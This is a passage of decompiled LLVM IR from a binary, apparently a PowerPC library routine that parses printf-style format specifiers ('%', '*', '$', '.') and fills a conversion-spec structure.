  br i1 %v3_1000efb0, label %dec_label_pc_1000efb8, label %dec_label_pc_1000ef88

dec_label_pc_1000efb8:                            ; preds = %dec_label_pc_1000efa8
  %v1_1000efb8 = add i32 %v0_1000efa0, -1
  %v2_1000efb8 = inttoptr i32 %v1_1000efb8 to i8*
  %v3_1000efb8 = load i8, i8* %v2_1000efb8, align 1
  %v4_1000efb8 = zext i8 %v3_1000efb8 to i32
  store i32 %v4_1000efb8, i32* %r0.global-to-local, align 4
  %v0_1000efbc = load i32, i32* %r6.global-to-local, align 4
  %v1_1000efbc = and i32 %v0_1000efbc, 10
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1000efc4 = icmp eq i8 %v3_1000efb8, 37
  %v1_1000efc8 = udiv i32 %v1_1000efbc, 2
  store i32 %v1_1000efc8, i32* %r9.global-to-local, align 4
  %v2_1000efcc = sub nuw nsw i32 -1, %v1_1000efc8
  %v3_1000efcc = and i32 %v0_1000efbc, %v2_1000efcc
  store i32 %v3_1000efcc, i32* %r6.global-to-local, align 4
  br i1 %v3_1000efc4, label %dec_label_pc_1000efdc, label %dec_label_pc_1000eea8

dec_label_pc_1000efd8:                            ; preds = %dec_label_pc_1000ef04, %dec_label_pc_1000ef54
  store i32 %v0_1000ef04, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000efdc

dec_label_pc_1000efdc:                            ; preds = %dec_label_pc_1000ef68, %dec_label_pc_1000efb8, %dec_label_pc_1000efd8
  %v0_1000f010 = phi i32 [ 0, %dec_label_pc_1000efb8 ], [ %v0_1000ef30, %dec_label_pc_1000ef68 ], [ %v0_1000ef30, %dec_label_pc_1000efd8 ]
  %v1_1000f01c = phi i32 [ %v0_1000efa0, %dec_label_pc_1000efb8 ], [ %v0_1000ef60, %dec_label_pc_1000ef68 ], [ %v0_1000ef60, %dec_label_pc_1000efd8 ]
  %v0_1000f018 = phi i32 [ %v1_1000ef8c, %dec_label_pc_1000efb8 ], [ %v0_1000ef04, %dec_label_pc_1000ef68 ], [ %v0_1000ef04, %dec_label_pc_1000efd8 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000efb8 ], [ %stack_var_-84.1, %dec_label_pc_1000ef68 ], [ %stack_var_-84.1, %dec_label_pc_1000efd8 ]
  %v1_1000efdc = inttoptr i32 %v0_1000f018 to i8*
  %v2_1000efdc = load i8, i8* %v1_1000efdc, align 1
  %v3_1000efdc = zext i8 %v2_1000efdc to i32
  store i32 %v3_1000efdc, i32* %r0.global-to-local, align 4
  %v3_1000efe0 = icmp eq i8 %v2_1000efdc, 42
  br i1 %v3_1000efe0, label %dec_label_pc_1000efe8, label %dec_label_pc_1000f028

dec_label_pc_1000efe8:                            ; preds = %dec_label_pc_1000efdc
  %v0_1000efe8 = load i32, i32* @r26, align 4
  %v3_1000efe8 = icmp eq i32 %v0_1000efe8, 0
  br i1 %v3_1000efe8, label %dec_label_pc_1000f018, label %dec_label_pc_1000eff0

dec_label_pc_1000eff0:                            ; preds = %dec_label_pc_1000efe8
  %v1_1000eff0 = inttoptr i32 %v1_1000f01c to i8*
  %v2_1000eff0 = load i8, i8* %v1_1000eff0, align 1
  %v3_1000eff0 = zext i8 %v2_1000eff0 to i32
  store i32 %v3_1000eff0, i32* %r0.global-to-local, align 4
  %v3_1000eff4 = icmp eq i8 %v2_1000eff0, 36
  br i1 %v3_1000eff4, label %dec_label_pc_1000effc, label %dec_label_pc_1000f2e8

dec_label_pc_1000effc:                            ; preds = %dec_label_pc_1000eff0
  %tmp60 = icmp slt i32 %v0_1000f010, 1
  br i1 %tmp60, label %dec_label_pc_1000f2e8, label %dec_label_pc_1000f004

dec_label_pc_1000f004:                            ; preds = %dec_label_pc_1000effc
  %v0_1000f004 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f004 = mul i32 %v0_1000f004, -4
  %v1_1000f008 = add i32 %v1_1000f01c, 1
  store i32 %v1_1000f008, i32* @r30, align 4
  %v0_1000f00c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000f00c = add i32 %v0_1000f00c, %v1_1000f004
  store i32 %v2_1000f00c, i32* %r9.global-to-local, align 4
  %v2_1000f010 = add i32 %v2_1000f00c, 12
  %v3_1000f010 = inttoptr i32 %v2_1000f010 to i32*
  store i32 %v0_1000f010, i32* %v3_1000f010, align 4
  %v0_1000f030.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f024

dec_label_pc_1000f018:                            ; preds = %dec_label_pc_1000efe8
  %v1_1000f018 = add i32 %v0_1000f018, 1
  store i32 %v1_1000f018, i32* %r0.global-to-local, align 4
  %v4_1000f01c = icmp eq i32 %v1_1000f018, %v1_1000f01c
  br i1 %v4_1000f01c, label %dec_label_pc_1000f024, label %dec_label_pc_1000f2e8

dec_label_pc_1000f024:                            ; preds = %dec_label_pc_1000f018, %dec_label_pc_1000f004
  %v0_1000f030.pre = phi i32 [ %v1_1000f01c, %dec_label_pc_1000f018 ], [ %v0_1000f030.pre.pre, %dec_label_pc_1000f004 ]
  store i32 -2147483648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f028

dec_label_pc_1000f028:                            ; preds = %dec_label_pc_1000efdc, %dec_label_pc_1000f024
  %v0_1000f030 = phi i32 [ %v1_1000f01c, %dec_label_pc_1000efdc ], [ %v0_1000f030.pre, %dec_label_pc_1000f024 ]
  %v0_1000f040 = phi i32 [ %v0_1000f010, %dec_label_pc_1000efdc ], [ -2147483648, %dec_label_pc_1000f024 ]
  %v0_1000f028 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000f028 = icmp eq i32 %v0_1000f028, 0
  %v1_1000f030 = inttoptr i32 %v0_1000f030 to i8*
  br i1 %v3_1000f028, label %dec_label_pc_1000f030, label %dec_label_pc_1000f054

dec_label_pc_1000f030:                            ; preds = %dec_label_pc_1000f028
  %v2_1000f030 = load i8, i8* %v1_1000f030, align 1
  %v3_1000f030 = zext i8 %v2_1000f030 to i32
  store i32 %v3_1000f030, i32* %r0.global-to-local, align 4
  %v3_1000f034 = icmp eq i8 %v2_1000f030, 46
  br i1 %v3_1000f034, label %dec_label_pc_1000f03c, label %dec_label_pc_1000f04c

dec_label_pc_1000f03c:                            ; preds = %dec_label_pc_1000f030
  %v1_1000f03c = add i32 %v0_1000f030, 1
  store i32 %v0_1000f040, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000eea8

dec_label_pc_1000f04c:                            ; preds = %dec_label_pc_1000f030
  store i32 %v0_1000f040, i32* @r31, align 4
  br label %dec_label_pc_1000f054

dec_label_pc_1000f054:                            ; preds = %dec_label_pc_1000f028, %dec_label_pc_1000f04c
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000f04c ], [ %v0_1000f040, %dec_label_pc_1000f028 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_1000f058 = load i8, i8* %v1_1000f030, align 1
  %v3_1000f058 = zext i8 %v2_1000f058 to i32
  store i32 %v3_1000f058, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1001959c.602 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f060

dec_label_pc_1000f060:                            ; preds = %dec_label_pc_1000f06c, %dec_label_pc_1000f054
  %v0_1000f06c = phi i32 [ %v1_1000f06c, %dec_label_pc_1000f06c ], [ ptrtoint ([9 x i8]* @global_var_1001959c.602 to i32), %dec_label_pc_1000f054 ]
  %v1_1000f060 = inttoptr i32 %v0_1000f06c to i8*
  %v2_1000f060 = load i8, i8* %v1_1000f060, align 1
  %v3_1000f060 = zext i8 %v2_1000f060 to i32
  store i32 %v3_1000f060, i32* %r0.global-to-local, align 4
  %v4_1000f064 = icmp eq i8 %v2_1000f058, %v2_1000f060
  br i1 %v4_1000f064, label %dec_label_pc_1000ee30, label %dec_label_pc_1000f06c

dec_label_pc_1000f06c:                            ; preds = %dec_label_pc_1000f060
  %v1_1000f06c = add i32 %v0_1000f06c, 1
  %v2_1000f06c = inttoptr i32 %v1_1000f06c to i8*
  %v3_1000f06c = load i8, i8* %v2_1000f06c, align 1
  %v4_1000f06c = zext i8 %v3_1000f06c to i32
  store i32 %v4_1000f06c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f06c, i32* %r11.global-to-local, align 4
  %v3_1000f070 = icmp eq i8 %v3_1000f06c, 0
  br i1 %v3_1000f070, label %dec_label_pc_1000f078, label %dec_label_pc_1000f060

dec_label_pc_1000f078:                            ; preds = %dec_label_pc_1000f06c, %dec_label_pc_1000ee30
  %v0_1000f0a0 = phi i32 [ %v1_1000ee30, %dec_label_pc_1000ee30 ], [ %v0_1000f030, %dec_label_pc_1000f06c ]
  %v0_1000f09c = phi i32 [ %v0_1000f06c, %dec_label_pc_1000ee30 ], [ %v1_1000f06c, %dec_label_pc_1000f06c ]
  %v2_1000f080 = sub i32 %v0_1000f09c, ptrtoint ([9 x i8]* @global_var_1001959c.602 to i32)
  store i32 %v2_1000f080, i32* %r9.global-to-local, align 4
  %v2_1000f084 = icmp sgt i32 %v2_1000f080, 1
  br i1 %v2_1000f084, label %dec_label_pc_1000f0a4, label %dec_label_pc_1000f08c

dec_label_pc_1000f08c:                            ; preds = %dec_label_pc_1000f078
  %v1_1000f08c = inttoptr i32 %v0_1000f0a0 to i8*
  %v2_1000f08c = load i8, i8* %v1_1000f08c, align 1
  %v3_1000f08c = zext i8 %v2_1000f08c to i32
  store i32 %v3_1000f08c, i32* %r0.global-to-local, align 4
  %v1_1000f090 = inttoptr i32 %v0_1000f09c to i8*
  %v2_1000f090 = load i8, i8* %v1_1000f090, align 1
  %v3_1000f090 = zext i8 %v2_1000f090 to i32
  store i32 %v3_1000f090, i32* %r9.global-to-local, align 4
  %v4_1000f094 = icmp eq i8 %v2_1000f08c, %v2_1000f090
  br i1 %v4_1000f094, label %dec_label_pc_1000f09c, label %dec_label_pc_1000f0a4

dec_label_pc_1000f09c:                            ; preds = %dec_label_pc_1000f08c
  %v1_1000f09c = add i32 %v0_1000f09c, 9
  store i32 %v1_1000f09c, i32* %r11.global-to-local, align 4
  %v1_1000f0a0 = add i32 %v0_1000f0a0, 1
  store i32 %v1_1000f0a0, i32* @r30, align 4
  br label %dec_label_pc_1000f0a4

dec_label_pc_1000f0a4:                            ; preds = %dec_label_pc_1000f08c, %dec_label_pc_1000f078, %dec_label_pc_1000f09c
  %v0_1000f0a8 = phi i32 [ %v0_1000f09c, %dec_label_pc_1000f08c ], [ %v0_1000f09c, %dec_label_pc_1000f078 ], [ %v1_1000f09c, %dec_label_pc_1000f09c ]
  %v0_1000f0a4 = phi i32 [ %v0_1000f0a0, %dec_label_pc_1000f08c ], [ %v0_1000f0a0, %dec_label_pc_1000f078 ], [ %v1_1000f0a0, %dec_label_pc_1000f09c ]
  %v1_1000f0a4 = inttoptr i32 %v0_1000f0a4 to i8*
  %v2_1000f0a4 = load i8, i8* %v1_1000f0a4, align 1
  %v3_1000f0a4 = zext i8 %v2_1000f0a4 to i32
  store i32 %v3_1000f0a4, i32* %r7.global-to-local, align 4
  %v1_1000f0a8 = add i32 %v0_1000f0a8, 9
  %v2_1000f0a8 = inttoptr i32 %v1_1000f0a8 to i8*
  %v3_1000f0a8 = load i8, i8* %v2_1000f0a8, align 1
  %v4_1000f0a8 = zext i8 %v3_1000f0a8 to i32
  store i32 %v4_1000f0a8, i32* %r0.global-to-local, align 4
  %v3_1000f0ac = icmp eq i8 %v2_1000f0a4, 0
  %v1_1000f0b0 = mul nuw nsw i32 %v4_1000f0a8, 256
  store i32 %v1_1000f0b0, i32* %r10.global-to-local, align 4
  br i1 %v3_1000f0ac, label %dec_label_pc_1000f2e8, label %dec_label_pc_1000f0b8

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f0a4
  %v1_1000f0bc = and i32 %v1_1000f0b0, 1024
  store i32 %v1_1000f0bc, i32* %r0.global-to-local, align 4
  %v3_1000f0bc = icmp eq i32 %v1_1000f0bc, 0
  store i32 ptrtoint ([21 x i8]* @global_var_100195dc.603 to i32), i32* %r8.global-to-local, align 4
  store i32 268566528, i32* %r3.global-to-local, align 4
  %v3_1000f0c8 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000f0c8, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100195d0.604 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_100195dc.603 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0d8

dec_label_pc_1000f0d8:                            ; preds = %dec_label_pc_1000f13c, %dec_label_pc_1000f0b8
  %v1_1000f0e4 = phi i32 [ %v1_1000f13c, %dec_label_pc_1000f13c ], [ ptrtoint ([21 x i8]* @global_var_100195dc.603 to i32), %dec_label_pc_1000f0b8 ]
  %v1_1000f0d8 = inttoptr i32 %v1_1000f0e4 to i8*
  %v2_1000f0d8 = load i8, i8* %v1_1000f0d8, align 1
  %v3_1000f0d8 = zext i8 %v2_1000f0d8 to i32
  store i32 %v3_1000f0d8, i32* %r0.global-to-local, align 4
  %v4_1000f0dc = icmp eq i8 %v2_1000f0d8, %v2_1000f0a4
  br i1 %v4_1000f0dc, label %dec_label_pc_1000f0e4, label %dec_label_pc_1000f13c

dec_label_pc_1000f0e4:                            ; preds = %dec_label_pc_1000f0d8
  %v2_1000f0e4 = sub i32 %v1_1000f0e4, ptrtoint ([21 x i8]* @global_var_100195dc.603 to i32)
  %tmp61 = icmp slt i32 %v2_1000f0e4, 18
  %brmerge = or i1 %v3_1000f0bc, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000f0f8, label %dec_label_pc_1000f0f4

dec_label_pc_1000f0f4:                            ; preds = %dec_label_pc_1000f0e4
  %v1_1000f0f4 = add i32 %v2_1000f0e4, -2
  br label %dec_label_pc_1000f0f8

dec_label_pc_1000f0f8:                            ; preds = %dec_label_pc_1000f0e4, %dec_label_pc_1000f0f4
  %storemerge = phi i32 [ %v1_1000f0f4, %dec_label_pc_1000f0f4 ], [ %v2_1000f0e4, %dec_label_pc_1000f0e4 ]
  %v0_1000f0f8 = phi i32 [ %v1_1000f0f4, %dec_label_pc_1000f0f4 ], [ %v2_1000f0e4, %dec_label_pc_1000f0e4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000f0f8 = load i32, i32* @r28, align 4
  %v2_1000f0f8 = add i32 %v1_1000f0f8, 32
  %v3_1000f0f8 = inttoptr i32 %v2_1000f0f8 to i32*
  store i32 %v0_1000f0f8, i32* %v3_1000f0f8, align 4
  store i32 ptrtoint (i32* @global_var_100195cf.605 to i32), i32* %r11.global-to-local, align 4
  %v0_1000f104.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f100

dec_label_pc_1000f100:                            ; preds = %dec_label_pc_1000f100, %dec_label_pc_1000f0f8
  %v0_1000f100 = phi i32 [ %v1_1000f100, %dec_label_pc_1000f100 ], [ ptrtoint (i32* @global_var_100195cf.605 to i32), %dec_label_pc_1000f0f8 ]
  %v1_1000f100 = add i32 %v0_1000f100, 1
  %v2_1000f100 = inttoptr i32 %v1_1000f100 to i8*
  %v3_1000f100 = load i8, i8* %v2_1000f100, align 1
  %v4_1000f100 = zext i8 %v3_1000f100 to i32
  store i32 %v4_1000f100, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f100, i32* %r11.global-to-local, align 4
  %v3_1000f104 = icmp sgt i32 %v0_1000f104.pre, %v4_1000f100
  br i1 %v3_1000f104, label %dec_label_pc_1000f100, label %dec_label_pc_1000f10c

dec_label_pc_1000f10c:                            ; preds = %dec_label_pc_1000f100
  %v0_1000f10c = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f10c = sub i32 %v1_1000f100, %v0_1000f10c
  %v1_1000f114 = mul i32 %v2_1000f10c, 2
  store i32 %v1_1000f114, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100195c0.606 to i32), i32* %r9.global-to-local, align 4
  %v2_1000f11c = add i32 %v1_1000f114, ptrtoint (i32* @global_var_100195c0.606 to i32)
  %v3_1000f11c = inttoptr i32 %v2_1000f11c to i16*
  %v4_1000f11c = load i16, i16* %v3_1000f11c, align 2
  %v5_1000f11c = sext i16 %v4_1000f11c to i32
  store i32 %v5_1000f11c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100195b0.607 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_100195dc.603 to i32), i32* %r8.global-to-local, align 4
  %v2_1000f12c = add i32 %v1_1000f114, ptrtoint (i32* @global_var_100195b0.607 to i32)
  %v3_1000f12c = inttoptr i32 %v2_1000f12c to i16*
  %v4_1000f12c = load i16, i16* %v3_1000f12c, align 2
  %v5_1000f12c = sext i16 %v4_1000f12c to i32
  store i32 %v5_1000f12c, i32* %r9.global-to-local, align 4
  %v2_1000f130 = or i32 %v5_1000f11c, %v1_1000f0b0
  store i32 %v2_1000f130, i32* %r0.global-to-local, align 4
  %v2_1000f134 = and i32 %v5_1000f12c, %v2_1000f130
  store i32 %v2_1000f134, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f148

dec_label_pc_1000f13c:                            ; preds = %dec_label_pc_1000f0d8
  %v1_1000f13c = add i32 %v1_1000f0e4, 1
  %v2_1000f13c = inttoptr i32 %v1_1000f13c to i8*
  %v3_1000f13c = load i8, i8* %v2_1000f13c, align 1
  %v4_1000f13c = zext i8 %v3_1000f13c to i32
  store i32 %v4_1000f13c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f13c, i32* %r8.global-to-local, align 4
  %v3_1000f140 = icmp eq i8 %v3_1000f13c, 0
  br i1 %v3_1000f140, label %dec_label_pc_1000f148, label %dec_label_pc_1000f0d8

dec_label_pc_1000f148:                            ; preds = %dec_label_pc_1000f13c, %dec_label_pc_1000f10c
  %v0_1000f148 = phi i32 [ %v2_1000f134, %dec_label_pc_1000f10c ], [ %v3_1000f0c8, %dec_label_pc_1000f13c ]
  store i32 %v0_1000f148, i32* %stack_var_-96, align 4
  %v0_1000f14c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f14c = call i32 @__asm_rlwinm(i32 %v0_1000f14c, i32 30, i32 31, i32 31)
  %not.v2_1000f150 = icmp eq i32 %v1_1000f14c, 0
  %v6_1000f154 = sext i1 %not.v2_1000f150 to i32
  store i32 %v6_1000f154, i32* %r9.global-to-local, align 4
  %v1_1000f158 = call i32 @__asm_rlwinm(i32 %v1_1000f0b0, i32 0, i32 20, i32 23)
  store i32 %v1_1000f158, i32* %r0.global-to-local, align 4
  %v1_1000f15c = call i32 @__asm_rlwinm(i32 %v6_1000f154, i32 0, i32 0, i32 27)
  store i32 %v1_1000f15c, i32* %r9.global-to-local, align 4
  %v0_1000f160 = load i32, i32* @r30, align 4
  %v1_1000f160 = inttoptr i32 %v0_1000f160 to i8*
  %v2_1000f160 = load i8, i8* %v1_1000f160, align 1
  %v3_1000f160 = zext i8 %v2_1000f160 to i32
  store i32 %v3_1000f160, i32* %r10.global-to-local, align 4
  %v0_1000f164 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f164 = call i32 @__asm_rlwinm(i32 %v0_1000f164, i32 0, i32 30, i32 28)
  %v1_1000f168 = add i32 %v1_1000f15c, 48
  store i32 %v1_1000f168, i32* %r9.global-to-local, align 4
  %v2_1000f16c = or i32 %v1_1000f164, %v1_1000f158
  store i32 %v2_1000f16c, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_1000f174 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f174 = load i32, i32* @r28, align 4
  %v2_1000f174 = add i32 %v1_1000f174, 12
  %v3_1000f174 = inttoptr i32 %v2_1000f174 to i32*
  store i32 %v0_1000f174, i32* %v3_1000f174, align 4
  %v0_1000f178 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f178 = load i32, i32* @r28, align 4
  %v2_1000f178 = add i32 %v1_1000f178, 4
  %v3_1000f178 = inttoptr i32 %v2_1000f178 to i32*
  store i32 %v0_1000f178, i32* %v3_1000f178, align 4
  %v0_1000f17c = load i32, i32* @r31, align 4
  %v1_1000f17c = load i32, i32* @r28, align 4
  %v2_1000f17c = add i32 %v1_1000f17c, 8
  %v3_1000f17c = inttoptr i32 %v2_1000f17c to i32*
  store i32 %v0_1000f17c, i32* %v3_1000f17c, align 4
  %v0_1000f180 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f180 = load i32, i32* @r28, align 4
  %v2_1000f180 = add i32 %v1_1000f180, 20
  %v3_1000f180 = inttoptr i32 %v2_1000f180 to i32*
  store i32 %v0_1000f180, i32* %v3_1000f180, align 4
  %v0_1000f184 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f184 = load i32, i32* @r28, align 4
  %v2_1000f184 = add i32 %v1_1000f184, 16
  %v3_1000f184 = inttoptr i32 %v2_1000f184 to i32*
  store i32 %v0_1000f184, i32* %v3_1000f184, align 4
  %v0_1000f188 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f188 = load i32, i32* @r28, align 4
  %v2_1000f188 = add i32 %v1_1000f188, 28
  %v3_1000f188 = inttoptr i32 %v2_1000f188 to i32*
  store i32 %v0_1000f188, i32* %v3_1000f188, align 4
  %v0_1000f18c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f18c = inttoptr i32 %v0_1000f18c to i8*
  %v2_1000f18c = load i8, i8* %v1_1000f18c, align 1
  %v3_1000f18c = zext i8 %v2_1000f18c to i32
  store i32 %v3_1000f18c, i32* %r9.global-to-local, align 4
  %v3_1000f190 = icmp eq i8 %v2_1000f18c, 0
  br i1 %v3_1000f190, label %dec_label_pc_1000f198, label %dec_label_pc_1000f1b0

dec_label_pc_1000f198:                            ; preds = %dec_label_pc_1000f148
  %v0_1000f198 = load i32, i32* @r30, align 4
  %v1_1000f198 = inttoptr i32 %v0_1000f198 to i8*
  %v2_1000f198 = load i8, i8* %v1_1000f198, align 1
  %v3_1000f198 = zext i8 %v2_1000f198 to i32
  store i32 %v3_1000f198, i32* %r0.global-to-local, align 4
  %v3_1000f19c = icmp eq i8 %v2_1000f198, 109
  br i1 %v3_1000f19c, label %dec_label_pc_1000f1a4, label %dec_label_pc_1000f2e8

dec_label_pc_1000f1a4:                            ; preds = %dec_label_pc_1000f198
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000f1a8 = load i32, i32* @r28, align 4
  %v2_1000f1a8 = add i32 %v1_1000f1a8, 28
  %v3_1000f1a8 = inttoptr i32 %v2_1000f1a8 to i32*
  store i32 %v3_1000f18c, i32* %v3_1000f1a8, align 4
  %v0_1000f1ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f1ac = load i32, i32* @r28, align 4
  %v2_1000f1ac = add i32 %v1_1000f1ac, 32
  %v3_1000f1ac = inttoptr i32 %v2_1000f1ac to i32*
  store i32 %v0_1000f1ac, i32* %v3_1000f1ac, align 4
  br label %dec_label_pc_1000f1b0

dec_label_pc_1000f1b0:                            ; preds = %dec_label_pc_1000f148, %dec_label_pc_1000f1a4
  %v0_1000f1b0 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000f1b0, 1
  br i1 %tmp62, label %dec_label_pc_1000f28c, label %dec_label_pc_1000f1b8

dec_label_pc_1000f1b8:                            ; preds = %dec_label_pc_1000f1b0
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000f1bc

dec_label_pc_1000f1bc:                            ; preds = %dec_label_pc_1000f274, %dec_label_pc_1000f1b8
  %v0_1000f1e4 = phi i32 [ 0, %dec_label_pc_1000f1b8 ], [ %v1_1000f278, %dec_label_pc_1000f274 ]
  %v2_1000f1bc = icmp sgt i32 %v0_1000f1e4, 2
  br i1 %v2_1000f1bc, label %dec_label_pc_1000f1e0, label %dec_label_pc_1000f1c4

dec_label_pc_1000f1c4:                            ; preds = %dec_label_pc_1000f1bc
  %v1_1000f1c4 = mul i32 %v0_1000f1e4, 4
  store i32 %v1_1000f1c4, i32* %r0.global-to-local, align 4
  %v0_1000f1c8 = load i32, i32* @r1, align 4
  %v2_1000f1c8 = add i32 %v0_1000f1c8, %v1_1000f1c4
  store i32 %v2_1000f1c8, i32* %r9.global-to-local, align 4
  %v1_1000f1cc = add i32 %v2_1000f1c8, 20
  %v2_1000f1cc = inttoptr i32 %v1_1000f1cc to i32*
  %v3_1000f1cc = load i32, i32* %v2_1000f1cc, align 4
  store i32 %v3_1000f1cc, i32* %r0.global-to-local, align 4
  %v1_1000f1d0 = load i32, i32* @r28, align 4
  %v2_1000f1d0 = add i32 %v1_1000f1d0, %v0_1000f1e4
  store i32 %v2_1000f1d0, i32* %r9.global-to-local, align 4
  %v1_1000f1d4 = urem i32 %v3_1000f1cc, 256
  store i32 %v1_1000f1d4, i32* %r11.global-to-local, align 4
  %v1_1000f1d8 = trunc i32 %v3_1000f1cc to i8
  %v3_1000f1d8 = add i32 %v2_1000f1d0, 36
  %v4_1000f1d8 = inttoptr i32 %v3_1000f1d8 to i8*
  store i8 %v1_1000f1d8, i8* %v4_1000f1d8, align 1
  %v0_1000f1ec.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f1ec

dec_label_pc_1000f1e0:                            ; preds = %dec_label_pc_1000f1bc
  %v2_1000f1e4 = add i32 %v0_1000f1e4, %stack_var_-84.3
  store i32 %v2_1000f1e4, i32* %r9.global-to-local, align 4
  %v1_1000f1e8 = add i32 %v2_1000f1e4, -2
  store i32 %v1_1000f1e8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f1ec

dec_label_pc_1000f1ec:                            ; preds = %dec_label_pc_1000f1c4, %dec_label_pc_1000f1e0
  %v0_1000f20c = phi i32 [ %v0_1000f1ec.pre, %dec_label_pc_1000f1c4 ], [ %v1_1000f1e8, %dec_label_pc_1000f1e0 ]
  %v1_1000f1ec = load i32, i32* @r26, align 4
  %v3_1000f1ec = icmp sgt i32 %v0_1000f20c, %v1_1000f1ec
  br i1 %v3_1000f1ec, label %dec_label_pc_1000f1f4, label %dec_label_pc_1000f200

dec_label_pc_1000f1f4:                            ; preds = %dec_label_pc_1000f1ec
  %v2_1000f1f4 = icmp sgt i32 %v0_1000f20c, 9
  br i1 %v2_1000f1f4, label %dec_label_pc_1000f2e8, label %dec_label_pc_1000f1fc

dec_label_pc_1000f1fc:                            ; preds = %dec_label_pc_1000f1f4
  store i32 %v0_1000f20c, i32* @r26, align 4
  br label %dec_label_pc_1000f200

dec_label_pc_1000f200:                            ; preds = %dec_label_pc_1000f1ec, %dec_label_pc_1000f1fc
  store i32 %v2_1000ee9c.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000f204 = load i32, i32* @r27, align 4
  %v1_1000f204 = mul i32 %v0_1000f204, 4
  store i32 %v1_1000f204, i32* %r0.global-to-local, align 4
  %v2_1000f208 = add i32 %v1_1000f204, %v2_1000ee9c.pre-phi
  %v3_1000f208 = inttoptr i32 %v2_1000f208 to i32*
  %v4_1000f208 = load i32, i32* %v3_1000f208, align 4
  store i32 %v4_1000f208, i32* @r31, align 4
  %v1_1000f20c = add i32 %v0_1000f20c, -1
  store i32 %v1_1000f20c, i32* @r25, align 4
  %v1_1000f210 = mul i32 %v1_1000f20c, 4
  %v3_1000f214 = icmp eq i32 %v4_1000f208, 8
  %v1_1000f218 = load i32, i32* @r28, align 4
  %v2_1000f218 = add i32 %v1_1000f218, %v1_1000f210
  store i32 %v2_1000f218, i32* %r9.global-to-local, align 4
  %v1_1000f21c = add i32 %v2_1000f218, 40
  %v2_1000f21c = inttoptr i32 %v1_1000f21c to i32*
  %v3_1000f21c = load i32, i32* %v2_1000f21c, align 4
  store i32 %v3_1000f21c, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f214, label %dec_label_pc_1000f274, label %dec_label_pc_1000f224

dec_label_pc_1000f224:                            ; preds = %dec_label_pc_1000f200
  %v3_1000f224 = icmp eq i32 %v3_1000f21c, 8
  br i1 %v3_1000f224, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f22c

dec_label_pc_1000f22c:                            ; preds = %dec_label_pc_1000f224
  %v4_1000f22c = icmp eq i32 %v3_1000f21c, %v4_1000f208
  br i1 %v4_1000f22c, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f234

dec_label_pc_1000f234:                            ; preds = %dec_label_pc_1000f22c
  %v1_1000f234 = call i32 @_promoted_size(i32 %v3_1000f21c)
  store i32 %v1_1000f234, i32* @r29, align 4
  %v0_1000f23c = load i32, i32* @r31, align 4
  store i32 %v0_1000f23c, i32* %r3.global-to-local, align 4
  %v1_1000f240 = call i32 @_promoted_size(i32 %v0_1000f23c)
  store i32 %v1_1000f240, i32* %r3.global-to-local, align 4
  %v0_1000f24c = call i32 @__asm_mfcr()
  store i32 %v0_1000f24c, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f24c, i32* %r0.global-to-local, align 4
  %v1_1000f250 = call i32 @__asm_rlwinm(i32 %v0_1000f24c, i32 31, i32 31, i32 31)
  store i32 %v1_1000f250, i32* %r0.global-to-local, align 4
  %v3_1000f254 = icmp eq i32 %v1_1000f250, 0
  br i1 %v3_1000f254, label %dec_label_pc_1000f274, label %dec_label_pc_1000f234.dec_label_pc_1000f25c_crit_edge

dec_label_pc_1000f234.dec_label_pc_1000f25c_crit_edge: ; preds = %dec_label_pc_1000f234
  %v0_1000f260.pre = load i32, i32* @r27, align 4
  %v0_1000f268.pre = load i32, i32* @r25, align 4
  %v1_1000f26c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f25c

